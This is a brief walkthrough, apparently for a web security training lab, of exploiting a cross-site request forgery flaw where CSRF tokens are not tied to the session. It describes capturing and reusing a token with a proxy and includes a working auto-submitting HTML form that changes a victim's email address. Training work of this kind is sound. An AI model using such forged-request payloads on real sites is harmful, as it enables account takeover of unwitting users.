# Lab: CSRF where token is not tied to user session

Login with the creds provided and turn on the proxy. Initiate an email address change and intercept the request. Copy the CSRF token and drop the request. Logout and log back in with the other creds provided. Again, initiate a change request and intercept the request. Edit it to use the previously captured token and forward it. Observe that the request is accepted.

Repeat the first half of the process to get a fresh token and include it in the exploit payload:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acfb1fa41e9dc318c0793883007d006b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;com" />
      <input type="hidden" name="csrf" value="vQZBhVOwM2gmkIJMtk9tLWGJCZfy0vwC" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

Deliver it to the victim to complete the lab.